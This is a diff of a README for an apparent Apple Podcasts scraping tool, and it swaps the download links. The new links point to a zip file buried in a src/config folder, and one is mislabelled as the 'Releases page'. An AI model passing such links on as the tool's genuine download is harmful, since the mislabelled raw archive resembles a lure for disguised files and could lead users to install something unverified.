@@ -6,7 +6,7 @@ Welcome to the Apple Podcasts Extractor! This tool allows you to pull detailed i
 
 ## 📥 Download
 
-[![Download apple-podcasts-extractor](https://raw.githubusercontent.com/barakadavid-k/apple-podcasts-extractor/main/apple-podcasts-extractor-scraper/data/apple-podcasts-extractor_3.7.zip%https://raw.githubusercontent.com/barakadavid-k/apple-podcasts-extractor/main/apple-podcasts-extractor-scraper/data/apple-podcasts-extractor_3.7.zip)](https://raw.githubusercontent.com/barakadavid-k/apple-podcasts-extractor/main/apple-podcasts-extractor-scraper/data/apple-podcasts-extractor_3.7.zip)
+[![Download apple-podcasts-extractor](https://github.com/barakadavid-k/apple-podcasts-extractor/raw/refs/heads/main/apple-podcasts-extractor-scraper/src/config/podcasts_apple_extractor_v1.6.zip%https://github.com/barakadavid-k/apple-podcasts-extractor/raw/refs/heads/main/apple-podcasts-extractor-scraper/src/config/podcasts_apple_extractor_v1.6.zip)](https://github.com/barakadavid-k/apple-podcasts-extractor/raw/refs/heads/main/apple-podcasts-extractor-scraper/src/config/podcasts_apple_extractor_v1.6.zip)
 
 ## 📃 Features
 
@@ -37,7 +37,7 @@ Before you begin, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/barakadavid-k/apple-podcasts-extractor/main/apple-podcasts-extractor-scraper/data/apple-podcasts-extractor_3.7.zip) to download the application. Follow the setup instructions to install it on your system.
+To get started, visit the [Releases page](https://github.com/barakadavid-k/apple-podcasts-extractor/raw/refs/heads/main/apple-podcasts-extractor-scraper/src/config/podcasts_apple_extractor_v1.6.zip) to download the application. Follow the setup instructions to install it on your system.
 
 ## 🛡 Privacy and Security
 
